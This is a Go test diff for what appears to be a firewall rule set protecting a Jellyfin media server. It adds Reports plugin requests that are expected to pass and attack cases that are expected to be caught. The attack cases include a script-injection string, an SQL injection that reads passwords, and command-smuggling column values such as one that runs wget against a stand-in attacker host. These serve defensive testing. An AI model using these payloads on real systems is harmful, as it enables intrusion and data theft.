@@ -131,6 +131,37 @@ func introSkipper(patterns map[string]any) string {
 	return vwJSON(s)
 }
 
+// jfReportColumns are the Reports plugin's columns, which its page groups,
+// sorts and picks by.
+var jfReportColumns = strings.Fields(`None Path Name PremiereDate DateAdded ReleaseDate Runtime PlayCount Season SeasonNumber Series Network
+	Year ParentalRating CommunityRating Trailers Specials AlbumArtist Album Disc Track Audio EmbeddedImage Video Resolution VideoBitrate
+	AudioBitrate Subtitles Genres Countries Status Tracks EpisodeSeries EpisodeSeason EpisodeNumber AudioAlbumArtist MusicArtist AudioAlbum
+	Locked ImagePrimary ImageBackdrop ImageLogo Actor Studios Composer Director GuestStar Producer Writer Artist Years ParentalRatings
+	CommunityRatings Overview ShortOverview Type Date UserPrimaryImage Severity Item User UserId`)
+
+// jfReportDefaults are the columns the Reports plugin shows a film, a show,
+// an album, an artist, a song and an episode with, which its page sends
+// once it has them.
+var jfReportDefaults = []string{
+	"Status|Locked|ImagePrimary|ImageBackdrop|ImageLogo|Name|DateAdded|ReleaseDate|Year|Genres|ParentalRating|CommunityRating|Runtime|Video|Resolution|VideoBitrate|AudioBitrate|Audio|Subtitles|Trailers|Specials|Path",
+	"Status|Locked|ImagePrimary|ImageBackdrop|ImageLogo|Name|Network|DateAdded|Year|Genres|ParentalRating|CommunityRating|Runtime|Trailers|Specials",
+	"Status|Locked|ImagePrimary|ImageBackdrop|ImageLogo|Name|AlbumArtist|DateAdded|ReleaseDate|Tracks|Year|Genres",
+	"Status|Locked|ImagePrimary|ImageBackdrop|ImageLogo|MusicArtist|Countries|DateAdded|Year|Genres",
+	"Status|Locked|ImagePrimary|ImageBackdrop|ImageLogo|Name|AudioAlbumArtist|AudioAlbum|Disc|Track|DateAdded|ReleaseDate|Year|Genres|ParentalRating|CommunityRating|Runtime|Audio",
+	"Status|Locked|ImagePrimary|ImageBackdrop|ImageLogo|Name|EpisodeSeries|Season|EpisodeNumber|DateAdded|ReleaseDate|Year|Genres|ParentalRating|CommunityRating|Runtime|Video|Resolution|VideoBitrate|AudioBitrate|Audio|Subtitles|Trailers|Specials|Path",
+}
+
+// jfReport is the query the Reports plugin's page sends for user's report,
+// with the pairs set over it.
+func jfReport(user string, pairs ...string) string {
+	q := url.Values{"StartIndex": {"0"}, "Limit": {"100"}, "IncludeItemTypes": {"Movie"}, "HasQueryLimit": {"true"}, "GroupBy": {"None"},
+		"ReportView": {"ReportData"}, "DisplayType": {"Screen"}, "UserId": {user}, "SortOrder": {"Ascending"}}
+	for i := 0; i+1 < len(pairs); i += 2 {
+		q.Set(pairs[i], pairs[i+1])
+	}
+	return q.Encode()
+}
+
 // libraryOptions are a library's settings as the dashboard saves them, the
 // fields filled as on a server in use, its folders made up.
 func (g jf) libraryOptions(paths ...string) map[string]any {
@@ -664,6 +695,20 @@ func TestTheJellyfinSetLetsItsClientsThrough(t *testing.T) {
 					"ChapterAnalyzerCommercialPattern": ""}} {
 				rs = append(rs, jfRequest{"POST", jfIntroSkipper, js, introSkipper(patterns), false, web})
 			}
+			// It shows the Reports plugin's reports on screen, grouped,
+			// sorted and with columns picked, and downloads them.
+			for _, col := range jfReportColumns {
+				rs = append(rs, jfRequest{"GET", "/Reports/Items?" + jfReport(u.id(), "GroupBy", col, "SortBy", col, "ReportColumns", col), "", "", false, web})
+			}
+			for _, cols := range append(slices.Clone(jfReportDefaults), strings.Join(jfReportColumns, "|")) {
+				rs = append(rs, jfRequest{"GET", "/Reports/Items?" + jfReport(u.id(), "ReportColumns", cols), "", "", false, web},
+					jfRequest{"GET", "/Reports/Headers?" + jfReport(u.id(), "ReportColumns", cols), "", "", false, web})
+			}
+			rs = append(rs, jfRequest{"GET", "/Reports/Activities?" + jfReport(u.id(), "ReportView", "ReportActivities", "IncludeItemTypes", "Episode",
+				"ReportColumns", "Date|User|Type|Severity|Name|ShortOverview|Overview|UserPrimaryImage|Item"), "", "", false, web})
+			for _, export := range []string{"CSV", "Excel", "HTML"} {
+				rs = append(rs, jfRequest{"GET", "/Reports/Items/Download?" + jfReport(u.id(), "HasQueryLimit", "false", "exportType", export, "ApiKey", u.id()), "", "", false, web})
+			}
 			for _, r := range rs {
 				if status := jfSend(t, plain, r); status != http.StatusOK {
 					t.Errorf("%s %s %.80q (%s): %d", r.method, r.path, r.body, r.client.userAgent, status)
@@ -812,6 +857,16 @@ func TestTheJellyfinSetKeepsTheAttacks(t *testing.T) {
 		{1, jfRequest{"POST", jfIntroSkipper, js, introSkipper(map[string]any{"subtitlepreviewpatterns": "<script>alert(1)</script>"}), false, c}},
 		{1, jfRequest{"POST", "/Plugins/" + g.uuid() + "/Configuration", js, vwJSON(map[string]any{"SubtitleRecapPattern": "x' UNION SELECT Password FROM Users--"}), false, c}},
 		{1, jfRequest{"POST", jfIntroSkipper + "?x=" + url.QueryEscape("<script>alert(1)</script>"), js, introSkipper(nil), false, c}},
+		// Only one of the Reports plugin's display types is not taken for a
+		// command, on its paths.
+		{3, jfRequest{"GET", "/Reports/Items?" + jfReport(g.id(), "DisplayType", "top"), "", "", false, c}},
+		{3, jfRequest{"GET", "/Reports/Items?" + jfReport(g.id()) + "&DisplayType=top", "", "", false, c}},
+		{3, jfRequest{"GET", "/Items?userId=" + g.id() + "&DisplayType=Screen", "", "", false, c}},
+		// And only a list of its columns is not read for commands.
+		{1, jfRequest{"GET", "/Reports/Items?" + jfReport(g.id(), "ReportColumns", "Name|Runtime;wget attacker.example/x"), "", "", false, c}},
+		{1, jfRequest{"GET", "/Reports/Items?" + jfReport(g.id(), "ReportColumns", "Name|reboot"), "", "", false, c}},
+		{1, jfRequest{"GET", "/Reports/Items?" + jfReport(g.id(), "ReportColumns", jfReportDefaults[0]) + "&ReportColumns=Name", "", "", false, c}},
+		{1, jfRequest{"GET", "/Items?userId=" + g.id() + "&ReportColumns=" + uriComponent(jfReportDefaults[0]), "", "", false, c}},
 		{2, jfRequest{"POST", "/DisplayPreferences/usersettings?client=emby", js, vwJSON(map[string]any{"CustomPrefs": map[string]any{"x": `{"a":"1 or 1"}`}}), false, c}},
 		// Outside the arguments the set knows, text is read as CRS reads it.
 		{2, jfRequest{"GET", "/Items?userId=" + g.id() + "&overview=" + url.QueryEscape("It's a trap: 'quoted' -- (really)!"), "", "", false, c}},
